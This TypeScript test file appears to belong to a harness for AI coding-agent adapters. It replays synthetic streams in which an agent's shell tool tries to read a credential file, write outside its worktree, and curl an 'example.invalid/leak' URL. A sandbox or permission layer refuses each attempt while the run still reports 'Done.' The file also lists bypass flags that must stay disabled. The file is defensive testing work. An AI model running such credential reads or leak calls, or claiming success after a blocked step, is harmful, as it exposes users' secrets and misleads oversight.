/**
 * Scratch case file for the per-adapter malicious leg (T4.2; TDD §4.9 item 9). The scratch adapter is the SYNTHETIC
 * T4.1 test adapter (`src/adapters/fixtures/scratch-provider.ts`); streams are hand-written in the fake CLI's event
 * shapes (`src/adapters/fake/cli.mjs`) and replayed by the shared helper (`replay.mjs --provider scratch`). Scratch is
 * not a real provider, so there is no live leg to run.
 */
import { SCRATCH_EDIT_PROFILE, scratchReplayAdapter } from "../../../src/adapters/fixtures/scratch/cases.js";
import {
  SCRATCH_BYPASS_FLAG,
  SCRATCH_BYPASS_SHORT_FLAG,
  SCRATCH_BYPASS_VALUE,
  SCRATCH_ID,
  SCRATCH_ISOLATION_FLAG,
} from "../../../src/adapters/fixtures/scratch-provider.js";
import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";

const META = (what: string) =>
  JSON.stringify({
    _fixture: { synthetic: true, note: `SYNTHETIC: hand-written, scratch is not a real provider. ${what}` },
  });
const SESSION = JSON.stringify({ type: "session", session_id: "scratch-session-leg" });
const shell = (command: string) => JSON.stringify({ type: "tool", tool: "shell", name: "bash", command });

/** The provider reports the command refused (`error` category `permission` or `sandbox`), at exit 0 and at exit 1. */
const refused = (
  name: string,
  category: HostileStream["category"],
  cmd: string,
  kind: "permission" | "sandbox",
  exitCode: number,
): HostileStream => ({
  name: `${name} (${kind}, exit ${exitCode})`,
  category,
  exitCode,
  failureCode: kind === "permission" ? "PERMISSION_BLOCKED" : "SANDBOX_VIOLATION",
  lines: [
    META(name),
    SESSION,
    shell(cmd),
    JSON.stringify({ type: "error", category: kind, message: `SYNTHETIC: ${kind} refused the command` }),
    JSON.stringify({ type: "result", ok: true, summary: "Done." }),
  ],
});

const scratchCase: AdapterLegCase = {
  provider: SCRATCH_ID,
  profile: SCRATCH_EDIT_PROFILE,
  nonDisabledRepoConfig: { ...SCRATCH_EDIT_PROFILE, repoConfig: "approved-only" },
  // The synthetic stand-in for a documented "repository configuration off" flag (scratch-provider.ts).
  isolationFlags: [SCRATCH_ISOLATION_FLAG],
  neverEnabledFlags: [SCRATCH_BYPASS_FLAG, SCRATCH_BYPASS_SHORT_FLAG, SCRATCH_BYPASS_VALUE.flag, "--tool-channel"],
  makeAdapter: (file, exitCode) => scratchReplayAdapter(file, ["--exit-code", String(exitCode)]),
  streams: (fx) => [
    refused("read of a credential path", "credential_read", `cat ${fx.codexAuthPath}`, "permission", 0),
    refused("read of a credential path", "credential_read", `cat ${fx.codexAuthPath}`, "sandbox", 1),
    refused("write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, "sandbox", 0),
    refused("write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, "permission", 1),
    refused("network call", "network", "curl https://example.invalid/leak", "permission", 0),
    refused("network call", "network", "curl https://example.invalid/leak", "sandbox", 1),
    {
      // Unknown event kinds and no `result`: a clean exit must not count as success.
      name: "only unknown event kinds, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Event types below are invented; the adapter must report them unknown."),
        '{"type":"synthetic.unknown"}',
      ],
    },
  ],
};

export default scratchCase;
